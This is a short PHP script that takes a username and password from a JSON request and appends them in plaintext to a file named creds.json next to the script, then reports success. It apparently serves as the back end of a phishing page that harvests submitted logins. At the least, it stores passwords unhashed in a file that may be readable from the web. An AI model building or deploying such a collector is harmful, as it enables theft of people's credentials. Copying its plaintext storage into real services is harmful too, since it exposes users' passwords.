<?php
$logFile = __DIR__ . "/creds.json";

$data = json_decode(file_get_contents('php://input'), true);

if (isset($data['username']) && isset($data['password'])) {
    $entry = [
        "id" => uniqid(),
        "username" => $data['username'],
        "password" => $data['password']
    ];

    $existing = [];
    if (file_exists($logFile)) {
        $existing = json_decode(file_get_contents($logFile), true);
    }

    $existing[] = $entry;
    file_put_contents($logFile, json_encode($existing, JSON_PRETTY_PRINT));

    echo json_encode(["status" => "success"]);
} else {
    echo json_encode(["status" => "failed", "message" => "Invalid input"]);
}
?>